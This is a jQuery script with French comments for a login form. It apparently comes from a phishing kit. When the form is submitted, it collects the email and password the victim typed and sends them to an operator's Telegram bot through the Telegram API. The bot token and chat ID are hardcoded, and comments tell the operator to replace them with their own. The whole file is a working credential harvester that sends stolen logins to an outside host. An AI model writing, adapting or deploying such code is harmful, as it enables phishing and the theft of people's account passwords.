$(document).ready(function() {
  $('#submit-btn').click(function(event) {
    event.preventDefault();

    // Récupérer les données du formulaire
    var email = $("#email").val();
    var password = $("#password").val();

    // Validation de l'email avec une expression régulière
    var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    if (!emailRegex.test(email)) {
      $('#error').show().text("Veuillez entrer un e-mail valide.");
      return;
    } else {
      $('#error').hide();
    }

    // Préparer le message à envoyer au bot Telegram
    var message = "Nouveau message reçu :\n";
    message += "Email : " + email + "\n";
    message += "Mot de passe : " + password;

    // Remplacer par votre token Telegram et l'ID du chat
    var telegramToken = "8054681380:AAGq5oUs8XRxM6NhZA-N9F0D9hjwbfqECLU"; // Remplacez ceci par votre Token de bot
    var chatId = "8179736651"; // Remplacez ceci par l'ID de chat de votre bot

    // URL API Telegram pour envoyer le message
    var telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

    // Envoi des données au bot Telegram via AJAX
    $.ajax({
      url: telegramUrl,
      type: 'POST',
      data: {
        chat_id: chatId,
        text: message
      },
      beforeSend: function() {
        $('#submit-btn').html('Envoi en cours...');
      },
      success: function(response) {
        if (response.ok) {
          $('#msg').html("Message envoyé avec succès !").show();
        } else {
          $('#msg').html("Erreur lors de l'envoi du message.").show();
        }
      },
      error: function() {
        $('#msg').html("Erreur de connexion avec Telegram.").show();
      },
      complete: function() {
        $('#submit-btn').html('Se connecter');
      }
    });
  });
});
